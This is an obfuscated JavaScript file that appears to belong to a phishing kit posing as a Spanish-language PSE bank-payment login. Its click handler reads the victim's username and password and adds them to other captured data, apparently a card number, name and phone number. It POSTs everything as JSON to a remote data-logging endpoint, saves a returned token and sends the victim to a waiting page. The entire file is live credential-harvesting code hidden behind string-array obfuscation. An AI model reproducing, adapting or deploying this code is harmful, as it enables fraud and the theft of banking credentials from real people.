function _0x1d32() {
  const _0x48a3a9 = [
    "puser",
    "/dataLogs/addDataLog",
    "log",
    "🛒​\x20SerF1nanz4",
    "info",
    "512456RegfMg",
    "preventDefault",
    "770300XtVgVF",
    "Error\x20al\x20procesar\x20la\x20solicitud:",
    "json",
    "focus",
    "dataLogId",
    "telnum",
    "8HDCqQT",
    "4Zpsprl",
    "getElementById",
    "Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "addEventListener",
    "metaInfo",
    "value",
    "stringify",
    "btnUsuario",
    "href",
    "602Dagyen",
    "txtUsuario",
    "setItem",
    "3414uEJThN",
    "disabled",
    "1611676mNZHYh",
    "772092MKuOvS",
    "user",
    "POST",
    "dataLogToken",
    "PSE",
    "81421LvOlZa",
    "token",
    "location",
    "origin",
    "54114PksOsI",
    "10EjFSIX",
  ];
  _0x1d32 = function () {
    return _0x48a3a9;
  };
  return _0x1d32();
}
const _0xd3b8e9 = _0x4835;
(function (_0x2e4b36, _0x392d9d) {
  const _0x1f1a8b = _0x4835,
    _0x5c8d04 = _0x2e4b36();
  while (!![]) {
    try {
      const _0x1e51fa =
        (-parseInt(_0x1f1a8b(0xcb)) / 0x1) *
          (-parseInt(_0x1f1a8b(0xdf)) / 0x2) +
        (parseInt(_0x1f1a8b(0xcf)) / 0x3) * (parseInt(_0x1f1a8b(0xde)) / 0x4) +
        parseInt(_0x1f1a8b(0xd8)) / 0x5 +
        (parseInt(_0x1f1a8b(0xeb)) / 0x6) * (parseInt(_0x1f1a8b(0xe8)) / 0x7) +
        -parseInt(_0x1f1a8b(0xd6)) / 0x8 +
        -parseInt(_0x1f1a8b(0xee)) / 0x9 +
        (parseInt(_0x1f1a8b(0xd0)) / 0xa) * (-parseInt(_0x1f1a8b(0xed)) / 0xb);
      if (_0x1e51fa === _0x392d9d) break;
      else _0x5c8d04["push"](_0x5c8d04["shift"]());
    } catch (_0x4639fb) {
      _0x5c8d04["push"](_0x5c8d04["shift"]());
    }
  }
})(_0x1d32, 0x19c4f);
function _0x4835(_0x25de9f, _0x154f0f) {
  const _0x1d32e6 = _0x1d32();
  return (
    (_0x4835 = function (_0x483584, _0x122e4f) {
      _0x483584 = _0x483584 - 0xca;
      let _0x232c4a = _0x1d32e6[_0x483584];
      return _0x232c4a;
    }),
    _0x4835(_0x25de9f, _0x154f0f)
  );
}
function updateLS() {
  const _0x5c062e = _0x4835;
  LS[_0x5c062e(0xea)](_0x5c062e(0xd5), JSON[_0x5c062e(0xe5)](info));
}
const button = document["getElementById"](_0xd3b8e9(0xe6)),
  userInput = document["getElementById"](_0xd3b8e9(0xe9)),
  passInput = document[_0xd3b8e9(0xe0)]("txtPass");
button[_0xd3b8e9(0xe2)]("click", async function (_0x22a699) {
  const _0x386191 = _0xd3b8e9;
  _0x22a699[_0x386191(0xd7)](), (button[_0x386191(0xec)] = !![]);
  if (userInput["value"] === "" && passInput["value"] === "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x386191(0xdb)](),
      (button[_0x386191(0xec)] = ![]);
    return;
  }
  const _0x48e77b = userInput[_0x386191(0xe4)],
    _0xea0d7 = passInput["value"];
  (info[_0x386191(0xe3)]["user"] = _0x48e77b),
    (info[_0x386191(0xe3)]["puser"] = _0xea0d7),
    updateLS();
  const _0x20efb4 = {
    reg: info[_0x386191(0xe3)]["cc"],
    name: info[_0x386191(0xe3)]["dudename"],
    cl: info[_0x386191(0xe3)][_0x386191(0xdd)],
    us: info[_0x386191(0xe3)][_0x386191(0xef)],
    ps: info[_0x386191(0xe3)][_0x386191(0xd1)],
    bn: _0x386191(0xd4),
    status: "Ingresó\x20datos",
    source: _0x386191(0xca),
  };
  try {
    const _0x4408e0 = await fetch(url + _0x386191(0xd2), {
      method: _0x386191(0xf0),
      headers: {
        "Content-Type": "application/json",
        Origin: window[_0x386191(0xcd)][_0x386191(0xce)],
      },
      body: JSON[_0x386191(0xe5)](_0x20efb4),
    });
    if (!_0x4408e0["ok"]) {
      const _0x3211b9 = await _0x4408e0[_0x386191(0xda)]();
      throw new Error(
        _0x3211b9["error"] ||
          "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor"
      );
    }
    const _0x8f3142 = await _0x4408e0[_0x386191(0xda)]();
    localStorage[_0x386191(0xea)](_0x386191(0xf1), _0x8f3142[_0x386191(0xcc)]),
      localStorage[_0x386191(0xea)](_0x386191(0xdc), _0x8f3142["id"]),
      console[_0x386191(0xd3)](
        "Datos\x20enviados\x20correctamente\x20al\x20servidor"
      ),
      (window[_0x386191(0xcd)][_0x386191(0xe7)] = "./wait.html");
  } catch (_0x286b0a) {
    console["error"](_0x386191(0xd9), _0x286b0a),
      alert(_0x386191(0xe1)),
      (button[_0x386191(0xec)] = ![]);
  }
});
